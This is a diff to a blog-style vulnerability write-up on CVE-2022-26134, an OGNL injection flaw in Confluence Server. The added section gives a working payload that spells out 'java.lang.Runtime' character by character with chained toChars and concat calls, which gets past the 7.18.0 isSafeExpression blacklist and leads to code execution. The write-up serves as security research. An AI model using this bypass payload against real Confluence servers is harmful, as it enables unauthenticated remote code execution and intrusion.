@@ -8,6 +8,10 @@ tags: 0day, cve-2022-26134
 description: Research analysis and develop a working exploit poc script 
 ---
 
+## Reference
+- https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass
+- https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
+
 ## 1. Introduction & Environment setup
 
 CVE-2022-26134 is an Preauth RCE ( OGNL injection vulnerability ) in Confluence Server. As there are a lot of technical analysis and payload about the vulnerability already, while the payload works on most of confluence server versions, but it won't work in Confluence server version 7.18.0 because the dev team has added some additional check for safe expression. So in this post, I will focus on the bypass `isSafeExpression` of Confluence version 7.18.0.
@@ -272,3 +276,26 @@ First loop, `i=0`
 As you can see, we've successfully bypassed the `this.unsafePropertyNames()` check :)
 
 ![image](https://user-images.githubusercontent.com/37280106/173011921-5bf140f7-57bb-4e85-9f02-53018dc9a2fb.png)
+
+### Just another payload that bypass isSafeExpression check
+The payload above is much simpler than the one I'm about to introduce, but they are all based on the same idea - using OGNL to build the string/payload that we need to bypass the blacklist/whitelist
+
+We can start our payload with this:
+```java
+${true.toString().charAt(0).toChars(67)[0].toString()} 
+output: C
+```
+
+- `true.toString()` = `""`
+- `charAt(0)` => return character at index 0
+- `toChars(67)[0]` converts the supplied character code point to a character representation and stores it in a char array
+
+Then from there, we can build up our payload `java.lang.Runtime` like this:
+```java
+true.toString().charAt(0).toChars(106)[0].toString().concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(118)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(108)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(103)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(82)[0].toString()).concat(true.toString().charAt(0).toChars(117)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(116)[0].toString()).concat(true.toString().charAt(0).toChars(105)[0].toString()).concat(true.toString().charAt(0).toChars(109)[0].toString()).concat(true.toString().charAt(0).toChars(101)[0].toString())
+```
+
+Here we pop calc again once again with a different way to bypass ;)
+![image](https://user-images.githubusercontent.com/37280106/173097800-94497909-b4d2-4c40-838e-f328956d4a10.png)
+
+More on how to automatically generate this payload, you can see more [here](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
